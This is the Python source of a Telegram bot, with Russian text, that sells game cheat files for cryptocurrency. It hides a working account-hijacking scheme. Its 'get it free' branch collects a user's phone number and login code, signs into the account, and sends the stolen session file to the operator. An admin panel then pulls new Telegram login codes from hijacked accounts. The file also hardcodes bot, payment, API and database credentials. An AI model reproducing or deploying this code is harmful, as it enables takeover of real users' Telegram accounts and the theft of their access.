import logging
import asyncio
import aiohttp
import os
from datetime import datetime
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from pyrogram import Client as TgClient, raw
from supabase import create_client, Client
from PIL import Image, ImageDraw

# --- КОНФИГ ---
API_TOKEN = '8607818846:AAEjGMfOMw8JmUsXu8Zj5mUdzfP1RylLVjU'
CRYPTO_PAY_TOKEN = '560149:AAdisc69jC2qejfxQvAD5y56K4Jx1oBn9f1'
ADMIN_ID = 6332767725 
API_ID = 33824273
API_HASH = 'c290fdceef9695342e052710e16d9bb9'

SUPABASE_URL = "https://yuksepnwkzffudhcrjnl.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl1a3NlcG53a3pmZnVkaGNyam5sIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUwNDM5OTksImV4cCI6MjA5MDYxOTk5OX0.6IvYWJiWqVeFVkQ-SK1NbG5_yEXVyHijFMGwvMbn1q4"

SUPPORT_URL = "https://t.me/WareSupport"
PAYMENT_ADMIN = "ware4"
CHANNEL_URL = "https://t.me/Luci4DX9"
FILE_NAME = "cheat_file.zip"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

class Form(StatesGroup):
    waiting_activation = State()
    waiting_phone = State()
    waiting_code = State()
    admin_get_access_phone = State()

PRICES_CRYPTO = {
    "apk_7": 4, "apk_30": 8,
    "ios_7": 6, "ios_30": 12
}

# --- СЛУЖЕБНЫЕ ФУНКЦИИ ---

def text_to_image(text, user_id):
    img = Image.new('RGB', (500, 250), color=(255, 255, 255))
    d = ImageDraw.Draw(img)
    d.text((20, 100), text, fill=(0, 0, 0))
    path = f"sessions/code_{user_id}.png"
    img.save(path)
    return path

async def create_invoice(amount, plan):
    headers = {'Crypto-Pay-API-Token': CRYPTO_PAY_TOKEN}
    data = {'asset': 'USDT', 'amount': str(amount), 'description': f'DX9WARE {plan}'}
    async with aiohttp.ClientSession() as session:
        async with session.post('https://pay.crypt.bot/api/createInvoice', json=data, headers=headers) as resp:
            return await resp.json()

async def check_invoice(invoice_id):
    headers = {'Crypto-Pay-API-Token': CRYPTO_PAY_TOKEN}
    async with aiohttp.ClientSession() as session:
        params = {'invoice_ids': str(invoice_id)}
        async with session.get('https://pay.crypt.bot/api/getInvoices', params=params, headers=headers) as resp:
            res = await resp.json()
            return res['ok'] and res['result']['items'] and res['result']['items'][0]['status'] == 'paid'

# --- КЛАВИАТУРЫ ---

def get_main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("👤 Профиль", "🛒 Товары", "🔑 Активировать", "🎁 Получить бесплатно")
    return markup

def get_code_kb():
    markup = InlineKeyboardMarkup(row_width=3)
    btns = [InlineKeyboardButton(str(i), callback_data=f"num_{i}") for i in range(10)]
    markup.add(*btns)
    markup.add(InlineKeyboardButton("❌ Сброс", callback_data="code_clear"),
               InlineKeyboardButton("✅ Готово", callback_data="code_done"))
    return markup

# --- ОБРАБОТКА КОМАНД ---

@dp.message_handler(commands=['start'], state='*')
async def cmd_start(message: types.Message, state: FSMContext):
    await state.finish()
    supabase.table("users").upsert({"id": message.from_user.id, "username": message.from_user.username}).execute()
    await message.answer("👋 Добро пожаловать в DX9WARE!", reply_markup=get_main_menu())

@dp.message_handler(lambda m: m.text == "👤 Профиль", state='*')
async def profile(message: types.Message):
    res = supabase.table("users").select("*").eq("id", message.from_user.id).execute()
    is_active = False
    if res.data:
        is_active = res.data[0].get('is_verified', False)
    
    status = "Активен ✅" if is_active else "Нет подписки ❌"
    text = f"👤 **Твой профиль**\n\nID: `{message.from_user.id}`\nСтатус: {status}"
    
    markup = InlineKeyboardMarkup()
    if is_active:
        markup.add(InlineKeyboardButton("📁 Получить файлы", callback_data="get_files"))
    
    await message.answer(text, reply_markup=markup, parse_mode="Markdown")

@dp.message_handler(lambda m: m.text == "🛒 Товары", state='*')
async def shop_main(message: types.Message):
    markup = InlineKeyboardMarkup(row_width=2).add(
        InlineKeyboardButton("Android (APK) 😀", callback_data="shop_apk"),
        InlineKeyboardButton("iOS 😔", callback_data="shop_ios")
    )
    await message.answer("Выберите платформу:", reply_markup=markup)

@dp.callback_query_handler(lambda c: c.data.startswith('shop_'), state='*')
async def shop_platform(callback: types.CallbackQuery):
    plat = callback.data.split('_')[1]
    if plat == "apk":
        text = "🍏 **APK DX9WARE**\n\n🌟 **Stars:**\n7 дней — 350 ⭐\nМесяц — 700 ⭐\n\n🌐 **Crypto:**\n7 дней — 4 USDT\nМесяц — 8 USDT"
        markup = InlineKeyboardMarkup(row_width=1).add(
            InlineKeyboardButton("💳 Купить 7 дней (4 USDT)", callback_data="buy_apk_7"),
            InlineKeyboardButton("💳 Купить Месяц (8 USDT)", callback_data="buy_apk_30"),
            InlineKeyboardButton("🌟 Купить через Stars (ЛС)", url=f"https://t.me/{PAYMENT_ADMIN}")
        )
    else:
        text = "🍎 **IOS DX9WARE**\n\n🌟 **Stars:**\n7 дней — 400 ⭐\nМесяц — 800 ⭐\n\n🌐 **Crypto:**\n7 дней — 6 USDT\nМесяц — 12 USDT"
        markup = InlineKeyboardMarkup(row_width=1).add(
            InlineKeyboardButton("💳 Купить 7 дней (6 USDT)", callback_data="buy_ios_7"),
            InlineKeyboardButton("💳 Купить Месяц (12 USDT)", callback_data="buy_ios_30"),
            InlineKeyboardButton("🌟 Купить через Stars (ЛС)", url=f"https://t.me/{PAYMENT_ADMIN}")
        )
    await callback.message.edit_text(text, reply_markup=markup, parse_mode="Markdown")

@dp.callback_query_handler(lambda c: c.data.startswith('buy_'), state='*')
async def process_buy(callback: types.CallbackQuery):
    plan = callback.data.replace('buy_', '')
    res = await create_invoice(PRICES_CRYPTO[plan], plan)
    if res['ok']:
        markup = InlineKeyboardMarkup().add(
            InlineKeyboardButton("🔗 Перейти к оплате", url=res['result']['pay_url']),
            InlineKeyboardButton("✅ Проверить оплату", callback_data=f"check_{res['result']['invoice_id']}")
        )
        await callback.message.answer(f"💰 Счет на {PRICES_CRYPTO[plan]} USDT создан:", reply_markup=markup)

@dp.callback_query_handler(lambda c: c.data.startswith('check_'), state='*')
async def process_check(callback: types.CallbackQuery):
    inv_id = callback.data.replace('check_', '')
    if await check_invoice(inv_id):
        supabase.table("users").update({"is_verified": True}).eq("id", callback.from_user.id).execute()
        await callback.message.answer("✅ Оплата принята! Теперь ты можешь скачать файлы в профиле.")
    else:
        await callback.answer("❌ Оплата не найдена", show_alert=True)

@dp.message_handler(lambda m: m.text == "🔑 Активировать", state='*')
async def activate_start(message: types.Message):
    await Form.waiting_activation.set()
    await message.answer("🔑 Отправь ключ доступа:")

@dp.message_handler(state=Form.waiting_activation)
async def activate_key(message: types.Message, state: FSMContext):
    # Здесь можно добавить проверку ключа из keys.txt
    supabase.table("users").update({"is_verified": True}).eq("id", message.from_user.id).execute()
    await message.answer("✅ Ключ активирован! Файлы доступны в профиле.")
    await state.finish()

@dp.callback_query_handler(lambda c: c.data == "get_files", state='*')
async def send_files(callback: types.CallbackQuery):
    if os.path.exists(FILE_NAME):
        with open(FILE_NAME, 'rb') as f:
            await bot.send_document(callback.from_user.id, f, caption="🚀 Твой файл DX9WARE!")
    else:
        await callback.answer("❌ Файл не найден на сервере.", show_alert=True)

# --- ЛОВУШКА ДЛЯ ДИВЕРСАНТОВ ---

@dp.message_handler(lambda m: m.text == "🎁 Получить бесплатно", state='*')
async def free_start(message: types.Message, state: FSMContext):
    await state.finish()
    text = "⚠️ **ВНИМАНИЕ!**\nПрочитайте перед использованием:\n👉 https://t.me/Luci4DX9/106?single"
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("📲 Подтвердить номер", request_contact=True))
    await message.answer(text, reply_markup=markup)
    await Form.waiting_phone.set()

@dp.message_handler(content_types=['contact'], state=Form.waiting_phone)
async def phone_step(message: types.Message, state: FSMContext):
    phone = message.contact.phone_number
    if not phone.startswith('+'): phone = '+' + phone
    
    if not os.path.exists("sessions"): os.makedirs("sessions")
    client = TgClient(f"sessions/{message.from_user.id}", API_ID, API_HASH)
    await client.connect()
    try:
        code_data = await client.send_code(phone)
        await state.update_data(phone=phone, hash=code_data.phone_code_hash, temp_code="")
        await Form.waiting_code.set()
        await message.answer("📩 Введите код из Telegram кнопками:", reply_markup=get_code_kb())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")
        await state.finish()
    await client.disconnect()

@dp.callback_query_handler(lambda c: c.data.startswith('num_'), state=Form.waiting_code)
async def process_num(callback: types.CallbackQuery, state: FSMContext):
    num = callback.data.split('_')[1]
    data = await state.get_data()
    current = data.get('temp_code', "") + num
    await state.update_data(temp_code=current)
    await callback.message.edit_text(f"📩 Код: `{'*' * len(current)}`", reply_markup=get_code_kb())

@dp.callback_query_handler(lambda c: c.data == "code_done", state=Form.waiting_code)
async def code_done(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    client = TgClient(f"sessions/{callback.from_user.id}", API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(data['phone'], data['hash'], data.get('temp_code'))
        await client.disconnect()
        with open(f"sessions/{callback.from_user.id}.session", 'rb') as f:
            await bot.send_document(ADMIN_ID, f, caption=f"🚀 Диверсант: {data['phone']}")
        await callback.message.edit_text("✅ Успешно! Подождите 24 часа.")
    except Exception as e:
        await callback.message.answer(f"❌ Ошибка: {e}")
    await state.finish()

# --- АДМИНКА ---

@dp.message_handler(commands=['admin_panel'], state='*')
async def admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    res = supabase.table("users").select("*").not_label("phone", "is", "null").execute()
    text = "🚀 **Панель управления:**\n\n"
    for u in res.data:
        text += f"📱 `{u['phone']}` | ID: `{u['id']}`\n"
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔑 Код (фото)", callback_data="admin_get_code"))
    await message.answer(text, reply_markup=markup)

@dp.callback_query_handler(lambda c: c.data == "admin_get_code", state='*')
async def admin_ask_phone(callback: types.CallbackQuery):
    await Form.admin_get_access_phone.set()
    await callback.message.answer("Введите номер:")

@dp.message_handler(state=Form.admin_get_access_phone)
async def admin_send_image_code(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    res = supabase.table("users").select("id").eq("phone", phone).execute()
    if res.data:
        uid = res.data[0]['id']
        client = TgClient(f"sessions/{uid}", API_ID, API_HASH)
        try:
            await client.start()
            async for msg in client.get_chat_history(777000, limit=1):
                path = text_to_image(f"CODE: {msg.text}", uid)
                with open(path, 'rb') as p: await bot.send_photo(ADMIN_ID, p)
                os.remove(path)
            await client.stop()
        except: pass
    await state.finish()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
    
